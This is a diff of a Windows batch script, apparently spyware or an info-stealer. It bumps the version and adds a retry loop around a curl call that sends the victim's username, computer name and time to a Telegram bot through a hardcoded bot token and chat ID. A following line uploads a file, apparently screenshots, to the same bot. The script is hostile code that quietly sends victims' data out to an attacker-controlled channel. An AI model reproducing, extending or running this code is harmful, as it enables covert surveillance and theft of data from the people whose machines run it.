@@ -10,7 +10,7 @@
 setlocal enabledelayedexpansion
 
 
-set "BATCHVERSION=28.5"
+set "BATCHVERSION=28.6"
 set "LOGFILE=%temp%\S1rNsvQgG.mpeez"
 set "RESULT=%TEMP%\TGRESU.txa"
 
@@ -2285,7 +2285,21 @@ set "CAPTION_UPDATESSCRNSHTS=Computer|%USERNAME%(%COMPUTERNAME%)|%HWID%|STARTED|
 set "FILE_PATH_UPDATESSCRNSHTS=%temp%\RUNNING_Topic.txt"
 
 
-curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|SENDFILENOW"
+curl -s -X POST "https://api.telegram.org/bot7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA/sendMessage" -d "chat_id=-1002163721260" -d "message_thread_id=73779" -d "text=%USERNAME%(%COMPUTERNAME%)|%time%|(v%BATCHVERSION%)|SENDFILENOW" > "%RESULT%"
+
+
+findstr /i "message_id" "%RESULT%" >nul
+if %errorlevel%==0 (
+    echo Message sent successfully!
+    echo.
+) else (
+    echo Failed to send message. Retrying...
+    echo.
+    timeout /t 2 /nobreak
+    echo Going to PEROTY
+    goto PEROTY
+)
+
 
 curl -s -X POST "https://api.telegram.org/bot%TOKEN_UPDATESSCRNSHTS%/sendDocument" ^
      -F "chat_id=%CHAT_ID_UPDATESSCRNSHTS%" ^
